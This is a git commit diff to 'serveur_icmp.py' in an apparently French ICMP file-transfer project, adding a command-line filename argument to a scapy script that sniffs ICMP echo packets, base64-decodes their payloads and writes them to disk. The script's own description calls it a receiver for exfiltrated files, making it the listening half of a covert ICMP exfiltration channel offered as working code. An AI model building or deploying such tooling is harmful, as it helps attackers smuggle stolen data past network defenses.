54862e4f2479536897e80257d4fefe09794b9796
itform-fr <131718750+itform-fr@users.noreply.github.com>
2024-06-21 23:32:22 +0200

    Update serveur_icmp.py

--- ICMP-FT/serveur_icmp.py
+++ ICMP-FT/serveur_icmp.py
@@ -1,11 +1,20 @@
 import base64
+import argparse
 from scapy.all import *
+parser = argparse.ArgumentParser(description="reception de fichiers exfiltrés")
+parser.add_argument('-f','--file', help='nom du fichier à recevoir',dest='file',type=str)
 
-with open('fichier à créer', "wb") as f:
+args = parser.parse_args()
+fichier=args.file
+if not args.file:
+    parser.print_help()
+    exit(1)
+filename = args.file
+with open(args.file, "wb") as f:
   while True:
       packet=sniff(filter="icmp[icmptype]==icmp-echo and ! icmp[8:4]==0x636f6b3f ",count=1)
       b64_payload = packet[0][Raw].load
-      bytes_read = base64.b64decode(b64_payload)      
+      bytes_read = base64.b64decode(b64_payload)
       if not bytes_read:
           break
       f.write(bytes_read)
